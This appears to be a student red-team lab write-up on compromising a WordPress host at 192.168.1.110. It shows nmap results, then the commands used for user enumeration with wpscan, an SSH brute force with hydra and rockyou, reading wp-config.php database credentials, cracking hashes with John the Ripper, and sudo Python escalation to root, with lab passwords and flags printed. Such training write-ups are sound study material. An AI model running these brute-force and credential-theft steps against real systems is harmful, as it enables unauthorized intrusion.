# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

![nmao_1](https://github.com/crashandmayhem/Final-Project/blob/main/Images/nmap%20-sV.png)

![nmap_2](https://github.com/crashandmayhem/Final-Project/blob/main/Images/nmap%20-sV_2.png)

This scan identifies the services below as potential points of entry:
- Target 1 _192.168.1.110_
![target1](https://github.com/crashandmayhem/Final-Project/blob/main/Images/target1%20points%20of%20entry.png)

  - **_Port 22_**: SSH (OpenSSH 6.7p1 Debian)
  - **_Port 80_**: HTTP (Apache httpd 2.4.10)
  - **_Port 111_**: rpcbind (2-4 RPC #100000)
  - **_Port 139_**: netbios-ssn (Samba smbd 3.X - 4.X)
  - **_Port 445_**: netbios-ssn (Samba smbd 3.X - 4.X)

The following vulnerabilities were identified on _Target 1_:
  - _CVE-2021-28041_ Open SSH
  - _CVE-2017-15710_ Apache https 2.4.10
  - _CVE-2017-8779_ Open rpcbind port could lead to DDoS
  - _CVE-2017-7494_ Samba NetBios

Other Vulnerabilities Include:

  - WordPress User Enumeration
    - Attackers were able to obtain a list of Usernames and taylor the attacks
  - Weak User Passwords
    - Attackers were able to Brute-Force one password and John the Ripper another  
  - Sensitive Data Exposure
    - Attackers were able to locate and use wp-config.php to log into SQL Database to retrieve more information
  - Python sudo privilege escalation

### Exploitation

_WordPress User Enumeration_
  -  Ran the command: wpscan --url http://192.168.1.110/wordpress --enumerate u
     -  This allowed me to get a list of usernames

![wpscan](https://github.com/crashandmayhem/Final-Project/blob/main/Images/wpscan_1.png)

![wpscan2](https://github.com/crashandmayhem/Final-Project/blob/main/Images/wpscan_3.png)

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: {b9bbcb33e11b80be759c4e844862482d}
    - **_CVE-2021-28041_ Open SSH AND _Weak Password_**
      - Ran a Brute Force Attack to obtain michael's password and then ssh into the server
        - Command: hydra -l michael -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.110 -t 4 ssh

- Brute Force

![brute force](https://github.com/crashandmayhem/Final-Project/blob/main/Images/hydra_1.png)

![brute force2](https://github.com/crashandmayhem/Final-Project/blob/main/Images/hydra_2.png)

- Command: ssh michael@192.168.1.110

![ssh michael](https://github.com/crashandmayhem/Final-Project/blob/main/Images/ssh%20michael.png)

- Found Flag 1 through scanning through the files and directories and also ran a GREP command
  - Commands:
    - cd /
    - cd /var/www
    - grep -R flag

![flag1_1](https://github.com/crashandmayhem/Final-Project/blob/main/Images/flag%201.png)

![flag1_2](https://github.com/crashandmayhem/Final-Project/blob/main/Images/grep%20for%20flags.png)

  - `flag2.txt`: {fc3fd58dcdad9ab23faca6e9a36e581c}
    - **Same Method as Flag1**
      - I was able to find the txt for Flag2 during the process of Flag1 and was located in /var/www and did a ls in the directory
      - Commands:
        - cd /var/www
        - ls
        - cat flag2.txt

![flag2](https://github.com/crashandmayhem/Final-Project/blob/main/Images/flag%202.png)

 - `flag3.txt`: {afc01ab56b50591e7dccf93122770cd2}
    - **Sensitive Data Exposure**
      - Signed in as Michael I was able to locate the login information for WordPress SQL Servers DB_USER 'root' DB_PASSWORD 'R@v3nSecurity'
        - cd /var/www/html/wordpress
        - ls
        - nano wp-config.php

![config files](https://github.com/crashandmayhem/Final-Project/blob/main/Images/mysql.png)

![nano mysql](https://github.com/crashandmayhem/Final-Project/blob/main/Images/nano%20wp-config.php.png)

- Once in MySQL, I was able to navigate through the database and locate Flags 3 and 4 within wp_posts and obtain 'Steven' hashed password

![mysql2](https://github.com/crashandmayhem/Final-Project/blob/main/Images/mysql_2.png)

![mysql3](https://github.com/crashandmayhem/Final-Project/blob/main/Images/mysql_3.png)

![sqlpw](https://github.com/crashandmayhem/Final-Project/blob/main/Images/mysql_user_pw.png)

- _Flags 3 & 4_

![flags3-4](https://github.com/crashandmayhem/Final-Project/blob/main/Images/flags%203_4.png)


 - `flag4.txt`: {715dea6c055b9fe3337544932f2941ceroot}
    - **Python sudo escalation**
      - With the hashed passwords, I was able to create a .txt file named _'wp_hashes.txt'_ and then use _John the Ripper_ to crack Steven's password 'pink84'
        - Commands:
          - root@Kali: cd Documents
          - nano wp_hashes.txt
            - inputted the hashes found in WordPress SQL Database
          - saved the txt file
          - john wp_hashes.txt

![john](https://github.com/crashandmayhem/Final-Project/blob/main/Images/Screenshot%202022-08-06%20142027.png)

- SSH as Steven and escalated to Root

![steven](https://github.com/crashandmayhem/Final-Project/blob/main/Images/escalate%20to%20root%20steven.png)

- Once privileges were escalated, started searching directories for flags
  - Commands:
    - ls -a
    - cd ../
    - ls
    - cd /root
    - ls -a
    - cat flag4.txt

![flag4](https://github.com/crashandmayhem/Final-Project/blob/main/Images/flag%20as%20root%20steven.png)

